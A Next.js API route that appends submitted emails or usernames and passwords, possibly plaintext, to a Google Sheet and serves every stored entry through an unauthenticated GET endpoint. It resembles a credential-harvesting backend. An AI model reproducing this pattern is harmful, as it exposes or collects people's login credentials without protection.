import { NextResponse } from "next/server";
import { google } from "googleapis";

export const runtime = "nodejs"; // 🔥 NECESARIO para googleapis en Vercel

// --- DEBUG INICIAL ---
console.log("ENV GOOGLE CLIENT:", process.env.GS_CLIENT_EMAIL ? "OK" : "MISSING");
console.log("ENV PRIVATE KEY EXISTS:", !!process.env.GS_PRIVATE_KEY);
console.log("ENV SHEET ID:", process.env.GS_SHEET_ID);

// =============================
// HELPERS
// =============================
function getEnv(name: string) {
  const v = process.env[name];
  if (!v) console.warn(`⚠️ ENV MISSING: ${name}`);
  return v;
}

const GS_CLIENT_EMAIL = getEnv("GS_CLIENT_EMAIL");
const GS_PRIVATE_KEY = getEnv("GS_PRIVATE_KEY");
const GS_SHEET_ID = getEnv("GS_SHEET_ID");

// =============================
// GOOGLE CLIENT
// =============================
async function getSheets() {
  if (!GS_CLIENT_EMAIL || !GS_PRIVATE_KEY) {
    throw new Error("Google credentials missing.");
  }

  // Fix for multiline keys
  const key = GS_PRIVATE_KEY.replace(/\\n/g, "\n");

  const auth = new google.auth.JWT({
    email: GS_CLIENT_EMAIL,
    key,
    scopes: ["https://www.googleapis.com/auth/spreadsheets"],
  });

  await auth.authorize();
  return google.sheets({ version: "v4", auth });
}

// =============================
// POST - INSERT IN SHEET
// =============================
export async function POST(req: Request) {
  try {
    const body = await req.json();

    const email =
      body.email || body.usuario || body.username || null;

    const passwordHash =
      body.passwordHash || body.password || null;

    const loggedAt = body.loggedAt || new Date().toISOString();

    if (!email || !passwordHash) {
      return NextResponse.json(
        { ok: false, message: "Faltan campos: email y passwordHash" },
        { status: 400 }
      );
    }

    if (!GS_SHEET_ID) {
      return NextResponse.json(
        { ok: false, message: "GS_SHEET_ID no definido" },
        { status: 500 }
      );
    }

    const sheets = await getSheets();

    const date = new Date(loggedAt);
    const formatted = date.toLocaleString("es-ES");

    await sheets.spreadsheets.values.append({
      spreadsheetId: GS_SHEET_ID,
      range: "Hoja 1!A:C",
      valueInputOption: "USER_ENTERED",
      requestBody: {
        values: [[email, passwordHash, formatted]],
      },
    });

    console.log("✔ Registro agregado:", email, formatted);

    return NextResponse.json({ ok: true });
  } catch (err: any) {
    console.error("❌ Error POST:", err.message);
    return NextResponse.json(
      { ok: false, message: "Error interno", details: err.message },
      { status: 500 }
    );
  }
}

// =============================
// GET - READ SHEET
// =============================
export async function GET() {
  try {
    if (!GS_SHEET_ID) {
      return NextResponse.json(
        { ok: false, message: "GS_SHEET_ID no definido" },
        { status: 500 }
      );
    }

    const sheets = await getSheets();

    const res = await sheets.spreadsheets.values.get({
      spreadsheetId: GS_SHEET_ID,
      range: "Hoja 1!A:C",
    });

    const rows = res.data.values || [];

    const parsed = rows.map((r, i) => ({
      id: i + 1,
      userEmail: r[0] ?? "",
      passwordHash: r[1] ?? "",
      loggedAt: r[2] ?? "",
    }));

    return NextResponse.json(parsed);
  } catch (err: any) {
    console.error("❌ Error GET:", err.message);
    return NextResponse.json(
      { ok: false, message: "Error leyendo Google Sheets", details: err.message },
      { status: 500 }
    );
  }
} //TODO hoja 1
